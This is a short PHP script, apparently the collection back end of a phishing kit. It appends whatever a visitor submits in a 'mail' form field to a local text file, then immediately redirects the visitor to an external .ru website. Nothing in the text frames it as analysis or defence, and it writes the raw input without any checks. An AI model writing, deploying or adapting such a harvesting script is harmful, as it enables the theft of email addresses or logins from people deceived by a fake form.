<?PHP
$Log = $_POST['mail'];
$log = fopen("submit.txt","at");
fwrite($log,"\n $Log \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vsbloger.ru'></head></html>";
?>